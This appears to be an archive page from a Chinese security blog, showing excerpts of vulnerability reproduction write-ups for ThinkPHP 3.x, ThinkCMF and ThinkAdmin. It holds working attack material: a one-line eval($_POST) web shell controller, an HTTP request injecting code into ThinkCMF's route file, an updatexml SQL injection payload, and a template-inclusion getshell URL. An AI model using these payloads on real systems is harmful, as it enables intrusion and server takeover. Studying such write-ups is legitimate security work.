@@ -1,0 +1,650 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/page/39/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main">
+  
+
+    
+    <article id="post-Thinkphp/Thinkphp 3.x 漏洞/Thinkphp_3.2.3_缓存漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Thinkphp/Thinkphp%203.x%20%E6%BC%8F%E6%B4%9E/Thinkphp_3.2.3_%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:04.467Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Thinkphp-3-2-3-缓存漏洞"><a href="#Thinkphp-3-2-3-缓存漏洞" class="headerlink" title="Thinkphp 3.2.3 缓存漏洞"></a>Thinkphp 3.2.3 缓存漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Thinkphp 3.2.3</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><ul>
+<li>  直接跟进到<code>/Library/Think/Cache/File.class.php</code>文件，看到set方法：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- --&gt;</span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>/**</p>
+<pre><code>       * 写入缓存
+       * @access public
+       * @param string $name 缓存变量名
+       * @param mixed $value  存储数据
+       * @param int $expire  有效时间 0为永久
+       * @return boolean
+       */
+      public function set($name,$value,$expire=null) &#123;
+          N(&#39;cache_write&#39;,1);
+          if(is_null($expire)) &#123;
+              $expire =  $this-&gt;options[&#39;expire&#39;];
+          &#125;
+          $filename   =   $this-&gt;filename($name);
+          $data   =   serialize($value);
+          if( C(&#39;DATA_CACHE_COMPRESS&#39;) &amp;&amp; function_exists(&#39;gzcompress&#39;)) &#123;
+              //数据压缩
+              $data   =   gzcompress($data,3);
+          &#125;
+          if(C(&#39;DATA_CACHE_CHECK&#39;)) &#123;//开启数据校验
+              $check  =  md5($data);
+          &#125;else &#123;
+              $check  =  &#39;&#39;;
+          &#125;
+          $data    = &quot;&lt;?php\n//&quot;.sprintf(&#39;%012d&#39;,$expire).$check.$data.&quot;\n?&gt;&quot;;
+          //data参数经过序列化，直接被写到文件内。
+
+          $result  =   file_put_contents($filename,$data);
+          if($result) &#123;
+              if($this-&gt;options[&#39;length&#39;]&gt;0) &#123;
+                  // 记录缓存队列
+                  $this-&gt;queue($name);
+              &#125;
+              clearstatcache();
+              return true;
+          &#125;else &#123;
+              return false;
+          &#125;
+      &#125;
+</code></pre>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- --&gt;</span><br></pre></td></tr></table></figure>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Thinkphp/Thinkphp%203.x%20%E6%BC%8F%E6%B4%9E/Thinkphp_3.2.3_%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Thinkphp/Thinkphp%203.x%20%E6%BC%8F%E6%B4%9E/Thinkphp_3.2.3_%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qwh600hly8v19z0dcg3g" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Thinkphp/Thinkphp 3.x 漏洞/Thinkphp_3.2.3_update注入漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Thinkphp/Thinkphp%203.x%20%E6%BC%8F%E6%B4%9E/Thinkphp_3.2.3_update%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:04.464Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Thinkphp-3-2-3-update注入漏洞"><a href="#Thinkphp-3-2-3-update注入漏洞" class="headerlink" title="Thinkphp 3.2.3 update注入漏洞"></a>Thinkphp 3.2.3 update注入漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>thinkphp是国内著名的php开发框架，有完善的开发文档，基于MVC架构，其中Thinkphp3.2.3是目前使用最广泛的thinkphp版本，虽然已经停止新功能的开发，但是普及度高于新出的thinkphp5系列，由于框架实现安全数据库过程中在update更新数据的过程中存在SQL语句的拼接，并且当传入数组未过滤时导致出现了SQL注入。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>&lt;= 3.2.3</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>这个问题很早之前就注意到了，只是一直没找到更常规的写法去导致注入的产生，在挖掘框架漏洞的标准是在使用官方的标准开发方式的前提下也会产生可以用的漏洞，这样才算框架级漏洞，跟普通的业务代码漏洞是有严格界线的。</p>
+<p>thinkphp系列框架过滤表达式注入多半采用I函数去调用think_filter</p>
+<pre><code>function think_filter(&amp;$value)&#123;
+    if(preg_match(&#39;/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i&#39;,$value))
+</code></pre>
+<p>有没有相关tips来达到I函数绕过呢？是可以的。</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Thinkphp/Thinkphp%203.x%20%E6%BC%8F%E6%B4%9E/Thinkphp_3.2.3_update%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Thinkphp/Thinkphp%203.x%20%E6%BC%8F%E6%B4%9E/Thinkphp_3.2.3_update%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qwh500hky8v1d8o98dhf" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Thinkphp/Thinkphp 3.x 漏洞/Thinkphp_3.2.3_select&amp;find&amp;delete注入漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Thinkphp/Thinkphp%203.x%20%E6%BC%8F%E6%B4%9E/Thinkphp_3.2.3_select&find&delete%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:04.461Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Thinkphp-3-2-3-select-amp-find-amp-delete-注入漏洞"><a href="#Thinkphp-3-2-3-select-amp-find-amp-delete-注入漏洞" class="headerlink" title="Thinkphp 3.2.3 select&amp;find&amp;delete 注入漏洞"></a>Thinkphp 3.2.3 select&amp;find&amp;delete 注入漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>&lt;= 3.2.3</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>通过github上的commit<br>对比其实可以粗略知道，此次更新主要是在<code>ThinkPHP/Library/Think/Model.class.php</code>文件中，其中对于<code>delete</code>，<code>find</code>，<code>select</code>三个函数进行了修改。</p>
+<p><code>delete</code>函数</p>
+<p><img src="/resource/Thinkphp3.2.3select&find&delete%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId25.png"></p>
+<p><code>select</code>函数</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Thinkphp/Thinkphp%203.x%20%E6%BC%8F%E6%B4%9E/Thinkphp_3.2.3_select&find&delete%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Thinkphp/Thinkphp%203.x%20%E6%BC%8F%E6%B4%9E/Thinkphp_3.2.3_select&find&delete%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qwh800hny8v1hxxwbwgr" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Thinkphp/Thinkphp 3.x 漏洞/Thinkphp_3.1.3_sql注入漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Thinkphp/Thinkphp%203.x%20%E6%BC%8F%E6%B4%9E/Thinkphp_3.1.3_sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:04.459Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Thinkphp-3-1-3-sql注入漏洞"><a href="#Thinkphp-3-1-3-sql注入漏洞" class="headerlink" title="Thinkphp 3.1.3 sql注入漏洞"></a>Thinkphp 3.1.3 sql注入漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Thinkphp 3.1.3</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>首先在网上下载对应的压缩包。</p>
+<p>漏洞位于<code>ThinkPHP/Lib/Core/Model.class.php</code> 文件的parseSql函数</p>
+<p>将这一条修复语句注释后开始一步步复现</p>
+<p><img src="/resource/Thinkphp3.1.3sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId24.png" alt="1.png"></p>
+<p>在ThinkPHP目录下创建app文件夹后创建index.php</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Thinkphp/Thinkphp%203.x%20%E6%BC%8F%E6%B4%9E/Thinkphp_3.1.3_sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Thinkphp/Thinkphp%203.x%20%E6%BC%8F%E6%B4%9E/Thinkphp_3.1.3_sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qwh300hjy8v10cdwhimm" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Thinkphp/Thinkphp专用shell" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Thinkphp/Thinkphp%E4%B8%93%E7%94%A8shell/" class="article-date">
+  <time datetime="2022-07-08T06:26:04.454Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Thinkphp-专用shell"><a href="#Thinkphp-专用shell" class="headerlink" title="Thinkphp 专用shell"></a>Thinkphp 专用shell</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>基于thinkphp框架的一句话写法<br>thinkphp框架使用入口文件调用控制器，直接写一句话可能会有解析问题导致无法执行指令，研究了一下把一句话套入框架控制器的方法，分享给大家参考，</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>在index的控制器文件夹下建立Test.php文件，代码如下:</p>
+<pre><code>&lt;?php 
+namespace app\index\controller; 
+
+class Test 
+
+&#123; 
+
+    public function test() 
+
+    &#123; 
+
+    eval($_POST[&quot;cmd&quot;]); 
+
+    &#125; 
+
+&#125;
+</code></pre>
+<p>一句话的地址就是<a target="_blank" rel="noopener" href="http://www.0-sec.org/index/tes">http://www.0-sec.org/index/tes</a></p>
+
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Thinkphp/Thinkphp%E4%B8%93%E7%94%A8shell/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Thinkphp/Thinkphp%E4%B8%93%E7%94%A8shell/" data-id="cl5c2qw6z00hiy8v12ebmauih" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-ThinkCMF/（CVE-2019-7580）ThinkCMF 5.0.190111 后台代码执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/ThinkCMF/%EF%BC%88CVE-2019-7580%EF%BC%89ThinkCMF%205.0.190111%20%E5%90%8E%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:04.275Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2019-7580）ThinkCMF-5-0-190111-后台代码执行漏洞"><a href="#（CVE-2019-7580）ThinkCMF-5-0-190111-后台代码执行漏洞" class="headerlink" title="（CVE-2019-7580）ThinkCMF 5.0.190111 后台代码执行漏洞"></a>（CVE-2019-7580）ThinkCMF 5.0.190111 后台代码执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>ThinkCMF 5.0.190111</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="0x01-利用过程："><a href="#0x01-利用过程：" class="headerlink" title="0x01 利用过程："></a>0x01 利用过程：</h3><p>后台登录状态下，<br>1、将payload插入数据库并读取然后写入data/conf/route.php文件</p>
+<pre><code>POST /portal/admin_category/addpost.html HTTP/1.1
+Host: www.0-sec.org
+Content-Length: 183
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Cookie: PHPSESSID=of2ar92rpeucrh4cg6s4t4dae6; admin_username=admin
+Connection: close
+
+parent_id=0&amp;name=111&amp;alias=1&#39;%3D%3Earray(%22%22)%2Cphpinfo()%2C&#39;2
+</code></pre>
+<p>2、然后访问：</p>
+<pre><code>/portal/admin_category/index.html
+</code></pre>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/ThinkCMF/%EF%BC%88CVE-2019-7580%EF%BC%89ThinkCMF%205.0.190111%20%E5%90%8E%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/ThinkCMF/%EF%BC%88CVE-2019-7580%EF%BC%89ThinkCMF%205.0.190111%20%E5%90%8E%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qw2w00hhy8v13ig2b42t" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-ThinkCMF/THINKCMFX_2.2.3漏洞合集" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/ThinkCMF/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/" class="article-date">
+  <time datetime="2022-07-08T06:26:04.272Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="ThinkCMF-2-2-3-漏洞合集"><a href="#ThinkCMF-2-2-3-漏洞合集" class="headerlink" title="ThinkCMF 2.2.3 漏洞合集"></a>ThinkCMF 2.2.3 漏洞合集</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>ThinkCMF 2.x</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="0x01-前台用户文章编辑提交存在注入"><a href="#0x01-前台用户文章编辑提交存在注入" class="headerlink" title="0x01 前台用户文章编辑提交存在注入"></a>0x01 前台用户文章编辑提交存在注入</h3><h4 id="0x01-1-漏洞演示"><a href="#0x01-1-漏洞演示" class="headerlink" title="0x01.1 漏洞演示"></a>0x01.1 漏洞演示</h4><pre><code>前台的文章编辑中操作框架注入，所以可以直接sql注入
+url:http://thinkcmf.test/index.php?g=Portal&amp;m=Article&amp;a=edit_post
+post:
+term:123
+post[post_title]:123
+post[post_title]:aaa
+post_title:123
+post[id][0]:bind
+post[id][1]:0 and (updatexml(1,concat(0x7e,(select user()),0x7e),1))
+</code></pre>
+<p><img src="/resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId26.png"></p>
+<h4 id="0x01-2-漏洞原理"><a href="#0x01-2-漏洞原理" class="headerlink" title="0x01.2 漏洞原理"></a>0x01.2 漏洞原理</h4>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/ThinkCMF/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/ThinkCMF/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/" data-id="cl5c2qw2v00hfy8v1dy3rbtoi" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-ThinkCMF/ThinkCMF 缓存Getshell" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/ThinkCMF/ThinkCMF%20%E7%BC%93%E5%AD%98Getshell/" class="article-date">
+  <time datetime="2022-07-08T06:26:04.270Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="ThinkCMF-缓存Getshell"><a href="#ThinkCMF-缓存Getshell" class="headerlink" title="ThinkCMF 缓存Getshell"></a>ThinkCMF 缓存Getshell</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>ThinkCMF X1.6.0ThinkCMF X2.1.0ThinkCMF X2.2.0ThinkCMF X2.2.1ThinkCMF X2.2.2</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="常规操作"><a href="#常规操作" class="headerlink" title="常规操作"></a>常规操作</h3><pre><code>http://www.0-sec.org/index.php?a=display&amp;templateFile=README.md&amp;content=%3C?php%20phpinfo();die();
+</code></pre>
+<p><img src="/resource/ThinkCMF%E7%BC%93%E5%AD%98Getshell/media/rId25.png"></p>
+<h2 id="利用缓存文件getshell"><a href="#利用缓存文件getshell" class="headerlink" title="利用缓存文件getshell"></a>利用缓存文件getshell</h2><p>由于thinkcmf2.x使用了thinkphp3.x作为开发框架，默认情况下启用了报错日志并且开启了模板缓存，导致可以使用加载一个不存在的模板来将生成一句话的PHP代码写入data/runtime/Logs/Portal目录下的日志文件中，再次包含该日志文件即可在网站根目录下生成一句话木马m.php</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/ThinkCMF/ThinkCMF%20%E7%BC%93%E5%AD%98Getshell/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/ThinkCMF/ThinkCMF%20%E7%BC%93%E5%AD%98Getshell/" data-id="cl5c2qw2t00hey8v11ifpg507" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-ThinkCMF/ThinkCMF 框架上的任意内容包含漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/ThinkCMF/ThinkCMF%20%E6%A1%86%E6%9E%B6%E4%B8%8A%E7%9A%84%E4%BB%BB%E6%84%8F%E5%86%85%E5%AE%B9%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:04.267Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="ThinkCMF-框架上的任意内容包含漏洞"><a href="#ThinkCMF-框架上的任意内容包含漏洞" class="headerlink" title="ThinkCMF 框架上的任意内容包含漏洞"></a>ThinkCMF 框架上的任意内容包含漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>ThinkCMF X1.6.0 ThinkCMF X2.1.0 ThinkCMF X2.2.0 ThinkCMF X2.2.1 ThinkCMF<br>X2.2.2</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>根据index.php中的配置，他的项目路径为application，打开 Portal 下的<br>Controller 目录，选择一个控制类文件。</p>
+<p><img src="/resource/ThinkCMF%E6%A1%86%E6%9E%B6%E4%B8%8A%E7%9A%84%E4%BB%BB%E6%84%8F%E5%86%85%E5%AE%B9%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/media/rId24.png"></p>
+<p>发现他的父类为Common\Controller\HomebaseController。<br>在HomeBaseController中加入如下测试代码</p>
+<p><img src="/resource/ThinkCMF%E6%A1%86%E6%9E%B6%E4%B8%8A%E7%9A%84%E4%BB%BB%E6%84%8F%E5%86%85%E5%AE%B9%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/media/rId25.png"></p>
+<p>ThinkPHP是一套基于MVC的应用程序框架，被分成三个核心部件：模型（M）、视图（V）、控制器（C）。<br>由于添加的代码在控制器中，根据ThinkPHP框架约定可以通过a参数来指定对应的函数名，但是该函数的修饰符必须为Public,<br>而添加的代码正好符合该条件。<br>可以通过如下URL进行访问，并且可以添加GET参数arg1传递给函数。</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/ThinkCMF/ThinkCMF%20%E6%A1%86%E6%9E%B6%E4%B8%8A%E7%9A%84%E4%BB%BB%E6%84%8F%E5%86%85%E5%AE%B9%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/ThinkCMF/ThinkCMF%20%E6%A1%86%E6%9E%B6%E4%B8%8A%E7%9A%84%E4%BB%BB%E6%84%8F%E5%86%85%E5%AE%B9%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qw2w00hgy8v1erkkahw3" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-ThinkAdmin/（ CVE-2020-25540）ThinkAdmin 未授权列目录_任意文件读取" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/ThinkAdmin/%EF%BC%88%20CVE-2020-25540%EF%BC%89ThinkAdmin%20%E6%9C%AA%E6%8E%88%E6%9D%83%E5%88%97%E7%9B%AE%E5%BD%95_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="article-date">
+  <time datetime="2022-07-08T06:26:04.242Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（-CVE-2020-25540）ThinkAdmin-未授权列目录-任意文件读取"><a href="#（-CVE-2020-25540）ThinkAdmin-未授权列目录-任意文件读取" class="headerlink" title="（ CVE-2020-25540）ThinkAdmin 未授权列目录/任意文件读取"></a>（ CVE-2020-25540）ThinkAdmin 未授权列目录/任意文件读取</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>ThinkAdmin v6</p>
+<p>ThinkAdmin v5（只能读取文件）</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p><code>app/admin/controller/api/Update.php</code>存在3个function，都是不用登录认证就可以使用的，引用列表如下：</p>
+<pre><code>namespace app\admin\controller\api;
+
+use think\admin\Controller;
+use think\admin\service\InstallService;
+use think\admin\service\ModuleService;
+</code></pre>
+<p><code>version()</code>可以获取到当前版本：<code>2020.08.03.01</code>，≤这个版本的都有可能存在漏洞</p>
